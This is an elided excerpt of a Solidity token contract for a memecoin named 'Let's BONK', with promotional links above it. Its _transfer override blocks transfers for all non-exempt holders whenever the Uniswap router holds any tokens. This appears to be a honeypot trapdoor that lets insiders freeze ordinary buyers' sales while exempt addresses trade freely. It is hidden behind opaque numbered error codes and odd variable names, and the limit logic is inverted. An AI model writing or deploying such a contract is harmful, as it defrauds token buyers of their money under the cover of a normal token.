...
https://letsbonk.fun/
https://x.com/bonk_fun
https://t.me/LETS_BONK

Let's BONK!
It's time to change the narrative.
Launch your memes on http://letsbonk.fun
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "1LetsBONK");
        require(recipient != address(0), "2LetsBONK");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "3LetsBONK");
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "4LetsBONK");
        require(spender != address(0), "5LetsBONK");
...
contract LetsBONK is ERC20 {
    ...
    constructor(address router) ERC20("Let's BONK", "LetsBONK", TOTAL_SUSUPPLYS) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "6LetsBONK");
        require(to != address(0), "7LetsBONK");
        _checkLimitation(from, to, amount);
        if (amount == 0) {
            return;
        }
        if (!isException[from] && !isException[to]) {
            require(balanceOf(address(uniswapV2Router)) == 0, "8LetsBONK");
        }
    ...
    function _checkLimitation(address from, address to, uint256 amount) internal {
        if (!hasLimit_) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmountbesomes, "9LetsBONK");
                ...
                require(balanceOf(to) + amount <= maxwalletssetsomes, "0LetsBONK");
            }
        }
    }
}